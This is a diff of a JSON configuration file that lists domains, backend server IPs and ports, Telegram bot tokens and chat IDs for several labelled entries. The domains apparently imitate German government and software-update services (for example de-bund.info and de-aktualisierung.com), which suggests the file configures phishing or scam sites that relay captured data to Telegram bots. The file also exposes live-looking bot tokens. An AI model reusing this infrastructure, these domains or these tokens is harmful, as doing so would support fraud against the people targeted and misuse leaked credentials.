@@ -1,6 +1,80 @@
 [
-  {"id":"37f99d03-d2bd-4e31-a97f-8cb239c919e8","domain":"lovable.app","api_host":"217.156.64.64","api_port":8080,"bot_token":null,"is_default":true,"label":"Lovablepreview"},
-  {"id":"19157d02-641d-41e2-a2c4-7cb80966f8ad","domain":"de-update.support","api_host":"217.156.64.64","api_port":8080,"bot_token":null,"is_default":false,"label":"Jude1"},
-  {"id":"42a4239a-742b-46d5-a5a4-029acdbb7a34","domain":"de-update.com","api_host":"217.156.64.64","api_port":8080,"bot_token":null,"is_default":false,"label":"Jude2"},
-  {"id":"3556360b-a0a5-4a3a-980b-5a97a76ba12a","domain":"de-securego.app","api_host":"91.208.197.52","api_port":8080,"bot_token":"8622153985:AAF2WJMHDUhzKrvxF9CTjCyjUhieBBiU01Y","is_default":false,"label":"VennomX"}
+  {
+    "id": "0796b962-9182-4cd4-8174-5873a5e95f56",
+    "label": "Localhost Dev",
+    "domain": "localhost",
+    "api_host": "217.156.64.64",
+    "api_port": 8080,
+    "bot_token": null,
+    "is_default": false,
+    "created_at": "2026-08-13T00:11:13.448362+00:00",
+    "updated_at": "2026-08-17T01:50:14.491736+00:00",
+    "address_group": "main",
+    "telegram_chat_id": null
+  },
+  {
+    "id": "ad2b819d-252a-42f3-93c1-8fe0cccc3d22",
+    "label": "Preview",
+    "domain": "lovable.app",
+    "api_host": "217.156.64.64",
+    "api_port": 8080,
+    "bot_token": null,
+    "is_default": true,
+    "created_at": "2026-08-12T23:45:06.535836+00:00",
+    "updated_at": "2026-08-17T01:50:14.796558+00:00",
+    "address_group": "main",
+    "telegram_chat_id": "-5332473849"
+  },
+  {
+    "id": "99239250-9b3b-4fcc-81a9-9af77a2eb696",
+    "label": "VennomX",
+    "domain": "de-securego.link",
+    "api_host": "91.208.197.52",
+    "api_port": 8080,
+    "bot_token": "8622153985:AAF2WJMHDUhzKrvxF9CTjCyjUhieBBiU01Y",
+    "is_default": false,
+    "created_at": "2026-08-16T22:33:03.468676+00:00",
+    "updated_at": "2026-08-17T01:52:08.866721+00:00",
+    "address_group": "VennomX",
+    "telegram_chat_id": "-5529685349"
+  },
+  {
+    "id": "fe8c4db7-f615-4919-9742-67eabc5c65dd",
+    "label": "Jude2",
+    "domain": "de-aktualisierung.com",
+    "api_host": "217.156.64.64",
+    "api_port": 8080,
+    "bot_token": "8694082751:AAFS-uvNTunll4mtEs_Q4JBLLqU8RZr25uI",
+    "is_default": false,
+    "created_at": "2026-08-17T15:31:36.255382+00:00",
+    "updated_at": "2026-08-17T15:32:37.960014+00:00",
+    "address_group": null,
+    "telegram_chat_id": "-5332473849"
+  },
+  {
+    "id": "3b650e58-3afa-4e6a-8176-68ae47b08de7",
+    "label": "Jude3",
+    "domain": "de-servicecenter.com",
+    "api_host": "217.156.64.64",
+    "api_port": 8080,
+    "bot_token": "8694082751:AAFS-uvNTunll4mtEs_Q4JBLLqU8RZr25uI",
+    "is_default": false,
+    "created_at": "2026-08-17T15:33:17.305775+00:00",
+    "updated_at": "2026-08-17T15:33:17.305775+00:00",
+    "address_group": null,
+    "telegram_chat_id": "-5332473849"
+  },
+  {
+    "id": "2269aea0-a49b-41c0-97d5-db3d79f82371",
+    "label": "Jude1",
+    "domain": "de-bund.info",
+    "api_host": "217.156.64.64",
+    "api_port": 8080,
+    "bot_token": "8694082751:AAFS-uvNTunll4mtEs_Q4JBLLqU8RZr25uI",
+    "is_default": false,
+    "created_at": "2026-08-14T12:51:12.505872+00:00",
+    "updated_at": "2026-08-17T17:11:35.09085+00:00",
+    "address_group": "Jude",
+    "telegram_chat_id": "-5332473849"
+  }
 ]
